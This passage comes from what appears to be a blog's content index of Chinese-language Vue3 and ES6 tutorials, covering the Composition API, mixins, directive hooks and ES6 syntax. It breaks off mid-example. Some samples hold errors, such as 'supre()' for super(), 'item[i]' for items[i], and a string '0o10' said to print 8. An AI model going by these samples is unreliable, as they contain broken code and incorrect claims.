=\u0026gt; { emitter.off(\u0026#39;change-msg\u0026#39;, changeMsg) }) return { msg, changeMsg, } }, } \u0026lt;/script\u0026gt; children2 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 \u0026lt;template\u0026gt; \u0026lt;div\u0026gt; 我是子元件2 \u0026lt;/div\u0026gt; \u0026lt;button @click=\u0026#39;changeMsg\u0026#39;\u0026gt;點選修改msg\u0026lt;/button\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script\u0026gt; import { ref } from \u0026#39;vue\u0026#39; import emitter from \u0026#39;../mitt\u0026#39; export default { name: \u0026#39;\u0026#39;, setup() { const changeMsg = () =\u0026gt; { emitter.emit(\u0026#39;change-msg\u0026#39;) } return { changeMsg, } }, } \u0026lt;/script\u0026gt; 演示 自定義指令 先看看 Vue2 自定義指令的鉤子：\nbind：當指令繫結在對應元素時觸發，只會觸發一次。 inserted：當對應元素被插入到 DOM 的父元素時觸發。 update：當元素更新時，這個鉤子會被觸發（此時元素的後代元素還沒有觸發更新）。 componentUpdated：當整個元件（包括子元件）完成更新後，這個鉤子觸發。 unbind：當指令被從元素上移除時，這個鉤子會被觸發，也只觸發一次。 在 Vue3 中，官方為了更有助於程式碼的可讀性和風格統一，把自定義指令的鉤子名稱改的更像是元件生命週期，儘管他們是兩回事：\nbind =\u0026gt; beforeMount。 inserted =\u0026gt; mounted。 beforeUpdate：新的鉤子，會在元素自身更新前觸發。 update =\u0026gt; 移除！ componentUpdated =\u0026gt; updated。 beforeUnmount：新的鉤子，當元素自身被解除安裝前觸發。 unbind =\u0026gt; unmounted。 過渡動畫 這個沒有什麼大的改動，只是修改了兩個 class 名字，正是因為沒有什麼大的改動，導致我曾經在這裡栽了大跟頭，寫完了怎麼都不對，後來查官網才知道。\n以下是直接引用官網的原文：\nv-enter-from：定義進入過渡的開始狀態。在元素被插入之前生效，在元素被插入之後的下一幀移除。 v-enter-active：定義進入過渡生效時的狀態。在整個進入過渡的階段中應用，在元素被插入之前生效，在過渡/動畫完成之後移除。這個類可以被用來定義進入過渡的過程時間，延遲和曲線函式。 v-enter-to：定義進入過渡的結束狀態。在元素被插入之後下一幀生效 (與此同時 v-enter-from 被移除)，在過渡/動畫完成之後移除。 v-leave-from：定義離開過渡的開始狀態。在離開過渡被觸發時立刻生效，下一幀被移除。 v-leave-active：定義離開過渡生效時的狀態。在整個離開過渡的階段中應用，在離開過渡被觸發時立刻生效，在過渡/動畫完成之後移除。這個類可以被用來定義離開過渡的過程時間，延遲和曲線函式。 v-leave-to：離開過渡的結束狀態。在離開過渡被觸發之後下一幀生效 (與此同時 v-leave-from 被刪除)，在過渡/動畫完成之後移除。 特別注意的是：\nv-enter 改成了 v-enter-form\nv-leave 改成了 v-leave-from\n其他小知識 Vue3 移除了 filter。 獲取元件實例的方法 getCurrentInstance()：\n這個方法可以獲取到當前元件的實例，相當於 Vue2 中的 this，但是它只在==開發環境==起效果，打包以後會報錯，所以大家不要依賴 getCurrentInstance 方法去獲取元件實例來完成一些主要功能。\n更詳細的可以檢視下面這篇文章：\n關於Vue3獲取當前元件例項的 getCurrentInstance 方法的補充 最後，畢竟是個人總結，難免會出現紕漏和錯誤，期待各路大神的補充和糾正。\n參考 參考網站 Vue3官方中文文件 Vue3.0光速上手 Volar - vue終極開發神器！ Vue3.0 新特性以及使用經驗總結 尚矽谷2021最新Vue.JS教程快速入門到專案實戰（Vue3/VueJS技術詳解） 那個忙了一夜的Vue3動畫很好，就是太短了 ","date":"2022-08-11T00:00:00Z","image":"https://live.staticflickr.com/65535/52277578302_d4a3e0c4aa_o.png","permalink":"https://wayneblog.ga/2022-08-11/vue3-quick-start/","title":"Vue3.0 快速入門，看完基本可以上手搞開發"},{"content":" 參考網站\n參考網站\n回顧 Option API 在了解 Composition Api 之前，首先回顧下我們使用 Option Api 遇到的問題，我們在 Vue2 中常常會需要在特定的區域（data、methods、watch、computed\u0026hellip;）編寫負責相同功能的代碼。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 \u0026lt;template\u0026gt; \u0026lt;div id=\u0026#34;app\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; v-model=\u0026#34;val\u0026#34; @keyup.enter=\u0026#34;addTodo\u0026#34;\u0026gt; \u0026lt;ul\u0026gt; \u0026lt;li v-for=\u0026#34;todo in todos\u0026#34; :key=\u0026#34;todo.id\u0026#34;\u0026gt;{{todo.title}}\u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script\u0026gt; export default { data(){ return{ val:\u0026#39;\u0026#39;, todos:[ {id:0, title:\u0026#39;吃饭\u0026#39;, done:false}, {id:1, title:\u0026#39;睡觉\u0026#39;, done:false}, {id:2, title:\u0026#39;lsp\u0026#39;, done:false}, ] } }, methods:{ addTodo(){ this.todos.push({ id:this.todos.length, title:this.val, done:false }) this.val = \u0026#39;\u0026#39; } } } \u0026lt;/script\u0026gt; Option Api 的缺陷 反覆橫跳 隨著業務複雜度越來越高，代碼量會不斷的加大；由於相關業務的代碼需要遵循 option 的配置寫到特定的區域，導致後續維護非常的複雜，代碼可複用性也不高。\n相信大部分同學都維護過超過200行的 .vue 組件，新增或者修改一個需求，就需要分別在 data、methods、computed 裡修改，滾動條反复上下移動，我稱之為『反复橫跳』，比如我們簡單的加個拍腦門的需求加個累加器，這種寫代碼上下反复橫條的感覺，相信大家都懂的： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 \u0026lt;template\u0026gt; \u0026lt;div id=\u0026#34;app\u0026#34;\u0026gt; \u0026lt;h1 @click=\u0026#34;add\u0026#34;\u0026gt;LSP {{count}}号 double is{{double}}\u0026lt;/h1\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; v-model=\u0026#34;val\u0026#34; @keyup.enter=\u0026#34;addTodo\u0026#34;\u0026gt; \u0026lt;ul\u0026gt; \u0026lt;li v-for=\u0026#34;todo in todos\u0026#34; :key=\u0026#34;todo.id\u0026#34;\u0026gt;{{todo.title}}\u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script\u0026gt; import Counter from \u0026#39;./counter\u0026#39; export default { mixins:[Counter], data(){ return{ count:1, val:\u0026#39;\u0026#39;, todos:[ {id:0, title:\u0026#39;吃饭\u0026#39;, done:false}, {id:1, title:\u0026#39;睡觉\u0026#39;, done:false}, {id:2, title:\u0026#39;lsp\u0026#39;, done:false}, ] } }, computed: { double() { return this.count * 2 } }, methods:{ addTodo(){ this.todos.push({ id:this.todos.length, title:this.val, done:false }) this.val = \u0026#39;\u0026#39; }, add(){ this.count++ } } } \u0026lt;/script\u0026gt; mixin 和 this 反覆橫跳的本質，在於功能的分塊組織，以及代碼量太大了，如果我們能把代碼控制在一屏，自然就解決了，vue2 裡的解決方案，是使用 mixin 來混合, 我們抽離一個 counter.js： counter.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 export default { data() { return { count:1 } }, computed: { double() { return this.count * 2 } }, methods:{ add(){ this.count++ } } } App.vue 1 2 3 4 5 6 7 8 import Counter from \u0026#39;./counter\u0026#39; export default { mixins:[Counter], data(){ ... }, ... } 這樣確實拆分了代碼，但是有一個很嚴重的問題，就是不打開 counter.js，App.vue 裡的 this 上，count、add這些屬性，是完全不知道從哪來的，你不知道是 mixin，還是全局 install，還是 Vue.prototype.count 設置的，數據來源完全模糊，調試爽死你，這也是 option 的一個大問題，this 是個黑盒，template 裡寫的 count 和 double，完全不知道從哪來的。\n如果有兩個 mixin，就更有意思了，比如我們又有一個需求，實時顯示鼠標的坐標位置 x，並且有一個乘以 2 的計算屬性湊巧也叫 double，再整一個 mixin：\nuseMouse.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 export default { data() { return { x:0 } }, methods:{ update(e){ this.x = e.pageX } }, computed:{ double(){ return this.x*2 } }, mounted(){ window.addEventListener(\u0026#39;mousemove\u0026#39;, this.update) }, destroyed(){ window.removeEventListener(\u0026#39;mousemove\u0026#39;, this.update) } } 這是一個獨立維護的 mixin，可能在 N 個地方用到，他根本不知道會不會有人和他衝突，然後用一下：\nApp.vue 1 2 3 4 5 6 import Counter from \u0026#39;./counter\u0026#39; import Mouse from \u0026#39;./mouse\u0026#39; export default { mixins:[Counter,Mouse], ...... } 兩個 mixin 裡都有 double 這個數，尷尬，看效果，lsp 的 count 被覆蓋了很尷尬，而且在 App.vue 這裡，你完全不知道這個 double 到底是哪個，調試很痛苦。\nComposition Api composition 就是為了解決這個問題存在的，通過組合的方式，把零散在各個 data、methods 的代碼重新組合，一個功能的代碼都放在一起維護，並且這些代碼可以單獨拆分成函數，顯然我們可以更加優雅的組織我們的代碼，函數。讓相關功能的代碼更加有序的組織在一起。\n我們用vue3演示一下功能，具體api就不解釋了直接vue3文檔搞起就可以：\nApp.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 \u0026lt;template\u0026gt; \u0026lt;div id=\u0026#34;app\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; v-model=\u0026#34;val\u0026#34; @keyup.enter=\u0026#34;addTodo\u0026#34;\u0026gt; \u0026lt;ul\u0026gt; \u0026lt;li v-for=\u0026#34;todo in todos\u0026#34; :key=\u0026#34;todo.id\u0026#34;\u0026gt;{{todo.title}}\u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script\u0026gt; import { reactive, ref, toRefs } from \u0026#39;vue\u0026#39; export default { setup(){ let val = ref(\u0026#39;\u0026#39;) let todos = reactive([ { id:0, title:\u0026#39;吃饭\u0026#39;, done:false }, { id:1, title:\u0026#39;睡觉\u0026#39;, done:false }, { id:2, title:\u0026#39;lsp\u0026#39;, done:false }, ]) function addTodo(){ todos.push({ id: todos.length, title: val.value, done: false }) val.value = \u0026#39;\u0026#39; } return {val, todos, addTodo} } } \u0026lt;/script\u0026gt; 利用函數我們可以把功能完整獨立的拆分成模塊或者函數，方便組織代碼，並且解決了 mixin 混亂的問題。\n比如我們的累加器，抽離一個counter.js：\ncounter.js 1 2 3 4 5 6 7 8 9 10 import { ref, computed } from \u0026#39;vue\u0026#39; export default function useCounter(){ let count = ref(1) function add(){ count.value++ } let double = computed(()=\u0026gt;count.value*2) return { count, double, add } } 直接使用：\n1 2 3 4 5 6 7 8 9 10 11 12 13 import { reactive, ref, toRefs } from \u0026#39;vue\u0026#39; + import useCounter from \u0026#39;./counter\u0026#39; export default { setup(){ let val = ref(\u0026#39;\u0026#39;) ... + let { count,double,add } = useCounter() return { val, todos, addTodo, + count, double, add } } } 再來一個鼠標位置也不在話下，而且可以很好地利用解構賦值的別名，解決 mixin 的命名衝突問題：\nuseMouse.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 import { ref, onMounted, onUnmounted, computed } from \u0026#39;vue\u0026#39; export default function useMouse(){ let x = ref(0) function update(e){ x.value = e.pageX } let double = computed(()=\u0026gt;x.value*2) onMounted(()=\u0026gt;{ window.addEventListener(\u0026#39;mousemove\u0026#39;, update) }) onUnmounted(()=\u0026gt;{ window.removeEventListener(\u0026#39;mousemove\u0026#39;, update) }) return { x, double } } 模板裡直接用 doubelX：\n1 2 3 4 5 6 7 let { count, double, add } = useCounter() let { x, double:doubleX } = useMouse() return { val, todos, addTodo, count, double, add, x, doubleX } script setup 不過有的同學可能，還有一個小小的吐槽，那就是 setup 函數最後的 return 也是集中的，如果行數太多，一樣會橫條一下下。\n這個好解決，因為本身我們可以把 todos 也抽離成函數，這樣 setup 就全部是數據的來源，非常精簡絲滑：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 import useCounter from \u0026#39;./counter\u0026#39; import useMouse from \u0026#39;./mouse\u0026#39; import useTodo from \u0026#39;./todos\u0026#39; export default { setup(){ let { val, todos, addTodo } = useTodo() let { count, double, add } = useCounter() let { x, double:doubleX } = useMouse() return { val, todos, addTodo, count, double, add, x, doubleX } } } 是不是賊爽呢，如果有些同學就是不想啥都抽離，還是覺得統一 return 很麻煩， 我們可以使用 vue3 的 setup script 功能，把 setup 這個配置也優化掉一個功能 export 一次：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;script setup\u0026gt; import useCounter from \u0026#39;./counter\u0026#39; import useMouse from \u0026#39;./mouse\u0026#39; import useTodo from \u0026#39;./todos\u0026#39; let { val, todos, addTodo } = useTodo() export { val, todos, addTodo } let { count, double, add } = useCounter() export { count, double, add } let { x, double:doubleX } = useMouse() export { x, doubleX } \u0026lt;/script\u0026gt; 具體看這裡\n","date":"2022-08-11T00:00:00Z","image":"https://live.staticflickr.com/65535/52277524312_b6dc5e213c_o.png","permalink":"https://wayneblog.ga/2022-08-11/option-api-vs-composition-api/","title":"圖解 Option API vs Composition API"},{"content":" 【尚硅谷】ES6教程 - 涵盖 ES6~ES11\n給進入 Vue.js 前的 ES6 必備知識\n超级实用的 ES6 特性\n【詳細 MDN 文件】\nECMAScript ES 是 ECMAScript 的簡稱，ECMAScript 是腳本語言的規範。而我們所使用的 JavaScript 是 ECMAScript 的一種實現。 簡言之：ECMA做出規範，各瀏覽器依照規範做出實現，因而不同瀏覽器會有兼容性不同的情況。 ES6 是 ES 的經典版本，是前端工程師崗位的高頻需求，是前端開發工程師求職的必備技能。 現階段前端行業發展迅猛，前端技術也在高速迭代， ES6-ES11 規范增加了很多 JavaScript 新特性。 ES 新特性已經成為前端技術發展的趨勢，語法簡潔，功能豐富，部分特性還有性能提升，前端開發三大框架 Vue、React、Angular 都用到了大量的新特性代碼，框架的升級也在向著新特性語法靠攏。 var 、 let 與 const var 、 let 與 const 在 Javascript 都是用來宣告變數的語法，最大的差別是他們的scope(變數有效範圍)的不同。切分var作用範圍的最小單位為 function，而 let 與 const 的作用範圍是 block 也就是俗稱的大括號：{ } 來切分。 const 所宣告的變數還有另一個特性是無法被重新賦值 (re-assign)。 let 特性 var 可以重複聲明，但 let 不能重複聲明。 演示： 1 2 3 4 5 var testA = \u0026#34;AAA\u0026#34;; var testA = \u0026#34;BBB\u0026#34;; // 不會報錯 let testB = \u0026#34;AAA\u0026#34;; let testB = \u0026#34;BBB\u0026#34;; // 會報錯 let 為塊級作用域 塊級作用域：變數只在代碼塊裡面有效({ ... }、if else、while、for) 在 ES5 中，作用域有：全局、函數、eval(嚴格模式下) 演示： 1 2 3 4 5 6 7 8 9 { var b = \u0026#34;BBB\u0026#34;; } console.log(b); // \u0026#34;BBB\u0026#34;，因為 var 非塊級作用域，所以聲明時會往外層(全局window)添加這個屬性 { let a = \u0026#34;AAA\u0026#34;; } console.log(a); // 會報錯 a is not defined 不存在變數提升 變數提升：代碼執行前會先進行變數搜集，var 聲明的變量在搜集時會先定義一個 undefined 的初始值。 演示： 1 2 3 4 5 6 7 // 在 a 用 var 聲明前輸出 console.log(a); // 不會報錯，會輸出 undefined var a = \u0026#34;AAA\u0026#34;; // 在 b 用 let 聲明前輸出 console.log(b); // 會報錯，Cannot access \u0026#39;b\u0026#39; before initialization let b = \u0026#34;BBB\u0026#34;; 不影響作用域鏈 演示： 1 2 3 4 5 6 7 { let school = \u0026#34;尚硅谷\u0026#34;; function fn() { console.log(school); } fn(); // 輸出 \u0026#34;尚硅谷\u0026#34;，在 fn 內沒有 school，會往外層尋找 } let 經典範例實踐 實作點擊 div 時切換顏色 代碼： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt; \u0026lt;h2 class=\u0026#34;page-header\u0026#34;\u0026gt; 點擊切換顏色 \u0026lt;/h2\u0026gt; \u0026lt;div class=\u0026#34;item\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;item\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;item\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;script\u0026gt; // 獲取 div 元素對象 let items = document.getElementsByClassName(\u0026#34;item\u0026#34;); // 遍歷並綁定事件 for (var i = 0; i\u0026lt; items.length; i++) { item[i].onclick = function() { // 修改當前元素的背景顏色 // 最佳寫法應為： this.style.background = \u0026#34;pink\u0026#34;; // 常見錯誤寫法： // items[i].style.background = \u0026#34;pink\u0026#34;; // // 原因： // i 使用 var 來聲明，var 聲明的變數非塊級作用域， // 因此 i 被聲明在全局(window)，此處取 i 會發現 window.i 已經等於 3 // 所以 items[3].style 會找不到。 // // 修正方式： // 將 i 改用 let 來聲明，讓 i 只存在於 for 迴圈中。 } } \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; const 特性 一定要賦初始值，且聲明後值不能被修改。 一般常數使用大寫(淺規則)。 也是塊級作用域 演示： 1 2 3 4 5 { const PLAYER = \u0026#34;UZI\u0026#34;; } console.log(PLAYER); // 會報錯，PLAYER is not defined 對於 Array 和 Object 的元素修改，不算對常數的修改，不會報錯。 演示： 1 2 3 4 { const TEAM = [\u0026#34;UZI\u0026#34;, \u0026#34;MXLG\u0026#34;, \u0026#34;Ming\u0026#34;, \u0026#34;Letme\u0026#34;]; TEAM.push(\u0026#34;Meiko\u0026#34;); // 不會報錯，因為變數所指向的地址沒有改變 } 函式的參數默認值 在 ES5 中必須這麼寫： 1 2 3 4 function printText(text) { text = text || \u0026#34;default\u0026#34;; console.log(text); } 在 ES6 以後可以這樣簡寫屬性： 1 2 3 function printText(text = \u0026#34;default\u0026#34;) { console.log(text); } 二進制與八進制字面量 ES6 支持二進制與八進制的字面量，通過在數字前面添加 0o 或者 0O 即可將其轉換為八進制值、添加 0b 或者 0B 即可將其轉換為二進制值。 1 2 3 4 5 6 7 let oValue = \u0026#34;0o10\u0026#34;; console.log(oValue); // \u0026gt;\u0026gt;\u0026gt; 8 let bValue = 0b10; console.log(bValue); // \u0026gt;\u0026gt;\u0026gt; 2 ES Module 與 import 、 export Javascript 自從 ES6 開始新增了模組系統(ES Module)，我們可以將每個 Javascript 的檔案當作是一個獨立的模組來看待，在 A 檔案匯出(export)在 B 檔案匯入(import)。 a.js 1 2 3 4 5 6 7 export const aString = \u0026#34;This is A String\u0026#34;; export function aFunction() { console.log(\u0026#34;A Function test\u0026#34;) } export const aObject = { a: 1 }; b.js 1 2 3 4 5 6 7 8 9 10 import { aString, aFunction, aObject } from \u0026#34;./a.js\u0026#34;; console.log(aString); // \u0026gt;\u0026gt;\u0026gt; \u0026#34;This is A String\u0026#34; console.log(aObject); // \u0026gt;\u0026gt;\u0026gt; { a: 1 } aFounction(); // \u0026gt;\u0026gt;\u0026gt; \u0026#34;A Function test\u0026#34; 當然在 export 也可以不用給變數名稱： c.js 1 2 3 export default function() { console.log(\u0026#34;Hello 008 JS!!!\u0026#34;); } 在另一個檔案就可以這樣來使用： d.js 1 2 3 4 import greeting from \u0026#34;./c.js\u0026#34;; greeting(); // \u0026gt;\u0026gt;\u0026gt; \u0026#34;Hello 008 JS!!!\u0026#34; 箭頭函數與 this 從 ES6 開始新增了一種叫做 「箭頭函式表示式」 (Arrow Function expression) 的函式表達式。快速看一下，如何將一般的函式轉換成箭頭函式的寫法： 1 2 3 const plus = function(numA, numB) { return numA + numB; }; 首先我們把參數往前提，然後把關鍵字 function 刪掉改成箭頭符號 =\u0026gt;： 1 2 3 const plus = (numA, numB) =\u0026gt; { return numA + numB; }; 如果這個函式只是想要回傳某個運算結果的時候，可以將 return 以及大括號 { } 省略： 1 const plus = (numA, numB) =\u0026gt; numA + numB; 而只有一個參數的時候，參數前面的小括號( )則可以省略： 1 2 3 4 const saySomething = msg =\u0026gt; console.log(msg); saySomething(\u0026#34;Hello!\u0026#34;); // \u0026gt;\u0026gt;\u0026gt; \u0026#34;Hello!\u0026#34; 另外需要注意的是，在箭頭函式使用 this 時，這時 this 會指向箭頭函式外面的 this，這個規則與原本 function 所宣告的函式不同，而且箭頭函式無法透過 bind() 強制指定裡面的 this。 字串模板 (Template literals) 以往我們在組合 JavaScript 的變數與 HTML 模板的時候，大多會透過「字串結合」 + 的模式，或透過陣列來新增字串，最後再用 [].join(\u0026quot;\u0026quot;) 的方式串接起來。但自 ES6 起，我們可以透過字串模板的語法，將變數、運算式等插入至我們的網頁模板當中，像這樣： 1 2 // 用「`...`」取代單/雙引號 `string text ${expression} string text` 這樣我們就可以將這個 expression 所代表的運算式或數值置入到字串裡頭了。 解構賦值 (Destructuring assignment) ES6 提供了解構賦值的語法，可以將陣列或者物件裡面的資料解開變成獨立的變數： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 const user = { id: 42, displayName: \u0026#34;jdoe\u0026#34;, fullName: { firstName: \u0026#34;John\u0026#34;, lastName: \u0026#34;Doe\u0026#34; } }; const { id, displayName, fullName } = user; console.log(id); // \u0026gt;\u0026gt;\u0026gt; 42 console.log(displayName); // \u0026gt;\u0026gt;\u0026gt; \u0026#34;jdoe\u0026#34; console.log(fullName); // \u0026gt;\u0026gt;\u0026gt; { firstName: \u0026#34;John\u0026#34;, lastName: \u0026#34;Doe\u0026#34; } 除了物件以外，陣列也可以： 1 2 3 4 5 6 7 8 9 const number = [1, 2, 3, 4, 5]; const [x, y] = number; console.log(x); // \u0026gt;\u0026gt;\u0026gt; 1 console.log(y); // \u0026gt;\u0026gt;\u0026gt; 2 ... 展開運算子 (Spread Operator) / 其餘運算子 (Rest Operator) 雖然 ES6 提供的展開運算子與其餘運算子的語法都是 ...，不過它們兩者所代表的涵意還是不太一樣。 展開運算子 展開運算子通常會用在陣列，或者是函式的參數，如： 1 2 3 4 5 const frameworks = [\u0026#34;Vue.js\u0026#34;, \u0026#34;Angular\u0026#34;, \u0026#34;React\u0026#34;]; const arr = [\u0026#34;Awesome\u0026#34;, ...frameworks]; console.log(arr); // \u0026gt;\u0026gt;\u0026gt; [\u0026#34;Awesome\u0026#34;, \u0026#34;Vue.js\u0026#34;, \u0026#34;Angular\u0026#34;, \u0026#34;React\u0026#34;] 其餘運算子 延續前面的例子，我們可以透過 「其餘運算子」 將剩下的部分拆解出來： 1 2 3 4 5 6 7 8 9 10 11 12 13 console.log(arr); // \u0026gt;\u0026gt;\u0026gt; [\u0026#34;Awesome\u0026#34;, \u0026#34;Vue.js\u0026#34;, \u0026#34;Angular\u0026#34;, \u0026#34;React\u0026#34;] const [a, b, ...others] = arr; console.log(a); // \u0026gt;\u0026gt;\u0026gt; \u0026#34;Awesome\u0026#34; console.log(b); // \u0026gt;\u0026gt;\u0026gt; \u0026#34;Vue.js\u0026#34; console.log(others); // \u0026gt;\u0026gt;\u0026gt; \u0026#34;Angular\u0026#34;, \u0026#34;React\u0026#34; 像這樣，我們可以搭配解構賦值的語法，將 arr 陣列拆解處來，並將剩餘的元素透過 ...others 分離。 當然，使用在物件上也是可以的： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 // 其餘 Properties const { x, y, ...z } = { x: 1, y: 2, a: 3, b: 4 }; console.log(x); // \u0026gt;\u0026gt;\u0026gt; 1 console.log(y); // \u0026gt;\u0026gt;\u0026gt; 2 console.log(z); // \u0026gt;\u0026gt;\u0026gt; { a: 3, b: 4 } // 展開 Properties const obj = { x, y, ...z }; console.log(obj); // \u0026gt;\u0026gt;\u0026gt; { x: 1, y: 2, a: 3, b: 4 } 要注意的是，其餘運算子所分離的部分只是陣列或物件的「淺拷貝」，若在多層物件使用時要特別小心。 Promise 物件 為了解決過去同步與非同步的問題，ES6 提供了 Promise 物件： 1 2 3 4 const myPromiseFunc = new Promise((resolve, reject) =\u0026gt; { resolve(someValue); // 完成 // reject(\u0026#34;failure reason\u0026#34;); // 拒絕 }); 當 Promise 的任務被完成的時候，我們就可以呼叫 resolve()，然後將取得的資料傳遞出去。 或是說想要拒絕這個 Promise，那麼就裡面呼叫 reject() 來拒絕他。 1 2 3 4 5 6 7 8 9 function myAsyncFunction(url) { return new Promise((resolve, reject) =\u0026gt; { // resolve() or reject() }); } // 透過 .then() 來取代過去的 callback hell myAsyncFunction(...) .then(() =\u0026gt; { ... }); async 與 await 在後來，從 Promise 物件又延伸出 async 與 await 兩個新特性，其實本質上是更簡便的語法糖。 假設我們有兩個非同步任務要處理，並且我們希望在 asyncFunc1 執行完成之後才去執行 asyncFunc2： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 function asyncFunc1(url) { return new Promise((resolve, reject) =\u0026gt; { // resolve() or reject() }); } function asyncFunc2(url) { return new Promise((resolve, reject) =\u0026gt; { // resolve() or reject() }); } const asyncCall = async() =\u0026gt; { const result1 = await asyncFunc1(); const result2 = await asyncFunc2(); }; 像這樣，透過 async 與 await 我們就可以擺脫過去一層層 callback 的惡夢，程式碼也更加簡潔。\n簡寫屬性 在 ES5 中必須這麼寫： 1 2 3 4 5 6 function createCoord(x, y) { return { x: x, y: y } } 在 ES6 以後可以這樣簡寫屬性： 1 2 3 4 5 6 function createCoord(x, y) { return { x, y } } 方法屬性 在 ES5 中必須這麼寫： 1 2 3 4 5 const math = { add: function(a, b) { return a + b; }, sub: function(a, b) { return a - b; }, multiply: function(a, b) { return a * b; } } 在 ES6 以後可以這樣簡寫屬性： 1 2 3 4 5 const math = { add(a, b) { return a + b; }, sub(a, b) { return a - b; }, multiply(a, b) { return a * b; } } 陣列方法 ES6 引入了許多有用的陣列方法，例如： find()：查找陣列中的成員，返回 null 表示沒找到 findIndex()：查找陣列成員的索引 some()：檢查某個斷言是否至少一個成員在陣列中 includes：陣列是否包含某項目 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 const array = [{ id: 1, checked: true }, { id: 2 }]; arr.find(item =\u0026gt; item.id === 2) // \u0026gt;\u0026gt;\u0026gt; { id: 2 } arr.findIndex(item =\u0026gt; item.id === 2) // \u0026gt;\u0026gt;\u0026gt; 1 arr.some(item =\u0026gt; item.checked) // \u0026gt;\u0026gt;\u0026gt; true const numberArray = [1,2,3,4]; numberArray.includes(2); // \u0026gt;\u0026gt;\u0026gt; true ES6 的 class ES6 支持 class 語法，但不是新的對象繼承模型，只是原型鍊的語法糖。 函式中使用 static 關鍵字定義構造函式的方法與屬性： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 class Student { constructor() { console.log(\u0026#34;I\u0026#39;m a student.\u0026#34;); } study() { console.log(\u0026#34;study!\u0026#34;); } static read() { console.log(\u0026#34;Reading Now.\u0026#34;); } } console.log(typeof Student); // \u0026gt;\u0026gt;\u0026gt; Function let stu = new Student(); // \u0026gt;\u0026gt;\u0026gt; \u0026#34;I\u0026#39;m a student.\u0026#34; stu.study(); // \u0026gt;\u0026gt;\u0026gt; \u0026#34;study!\u0026#34; stu.read(); // \u0026gt;\u0026gt;\u0026gt; \u0026#34;Reading Now.\u0026#34; class 的繼承(extends) extends 允許一個子類繼承父類，需要注意的是，子類的 constructor 函式中需要執行 supre() 函式。 當然你也可以在子類方法中調用父類的方法，如 supre.parentMethodName()。 class 的聲明不會提升 hoisting ，如果你要使用某個 class ，那你必須在使用之前定義他，否則會拋出 reference error 的錯誤。 在 class 中定義函式不需要使用 function 關鍵字。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 class Phone { constructor() { console.log(\u0026#34;I\u0026#39;m a phone.\u0026#34;); } } class MI extends Phone { constructor() { supre(); console.log(\u0026#34;I\u0026#39;m a phone designed by xiaomi.\u0026#34;); } } let mi8 = new MI(); // \u0026gt;\u0026gt;\u0026gt; \u0026#34;I\u0026#39;m a phone.\u0026#34; // \u0026gt;\u0026gt;\u0026gt; \u0026#34;I\u0026#39;m a phone designed by xiaomi.\u0026#34; class 的 super 方法 super 關鍵字被使用於通過函式存取父層 【詳細 MDN 文件】\n語法 1 2 super([arguments]); // calls the parent constructor. super.functionOnParent([arguments]); 當使用建構子，super 關鍵字必須出現在 this 關鍵字之前使用，super 關鍵字也可以使用在呼叫函式與父對象。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 let parent = { foo() { console.log(\u0026#34;Hello from the Parent\u0026#34;); } } let child = { foo() { super.foo(); console.log(\u0026#34;Hello from the Child\u0026#34;); } } Object.setPrototypeOf(child, parent); child.foo(); // \u0026gt;\u0026gt;\u0026gt; Hello from the Parent // \u0026gt;\u0026gt;\u0026gt; Hello from the Child 非同步處理工具 - Generator(生成器函式) 生成器函式 生成器對像是由一個 generator function 返回的,並且它符合可迭代協議和迭代器協議。 【詳細 MDN 文件】\n語法 1 2 3 4 5 6 7 8 function* gen() { yield 1; yield 2; yield 3; } let g = gen(); // \u0026#34;Generator { }\u0026#34; 方法 Generator.prototype.next()：返回一個由 yield表達式生成的值。 Generator.prototype.return()：返回給定的值並結束生成器。 Generator.prototype.throw()：向生成器拋出一個錯誤。 範例：一個無限迭代器 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 function* idMaker() { let index = 0; while(true) yield index++; } let gen = idMaker(); // \u0026#34;Generator { }\u0026#34; console.log(gen.next().value); // \u0026gt;\u0026gt;\u0026gt; 0 console.log(gen.next().value); // \u0026gt;\u0026gt;\u0026gt; 1 console.log(gen.next().value); // 